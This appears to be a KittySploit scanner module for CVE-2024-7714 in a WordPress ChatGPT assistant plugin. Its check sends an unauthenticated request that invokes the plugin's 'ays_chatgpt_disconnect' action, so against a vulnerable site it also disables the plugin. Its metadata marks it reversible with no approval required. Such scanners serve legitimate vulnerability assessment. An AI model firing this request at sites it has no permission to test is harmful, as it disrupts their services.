#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin lacks sufficient access controls allowing an unauthenticated user to disconnect the plugin from Ope."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AI Assistant with ChatGPT by AYS <= 2.0.9 - Unauthenticated AJAX Calls Detection',
        'description': 'The plugin lacks sufficient access controls allowing an unauthenticated user to disconnect the plugin from OpenAI, thereby disabling the plugin. Multiple actions are accessible: ays_chatgpt_disconnect, ays_chatgpt_connect, and ays_chatgpt_save_feedback',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'ays-chatgpt-assistant', 'wordpress', 'wp-plugin', 'wp', 'iac', 'vuln', 'ai'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-7714',
            'https://wpscan.com/vulnerability/04447c76-a61b-4091-a510-c76fc8ca5664/',
        ],
        'cve': 'CVE-2024-7714',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?ays_chatgpt_assistant_id=1&action=ays_chatgpt_admin_ajax&function=ays_chatgpt_disconnect'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('text/html',)
        body_regexes = ('^true$',)
        if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason='AI Assistant with ChatGPT by AYS <= 2.0.9 - Unauthenticated AJAX Calls detected',
                path=path,
            )
            return True
        return False

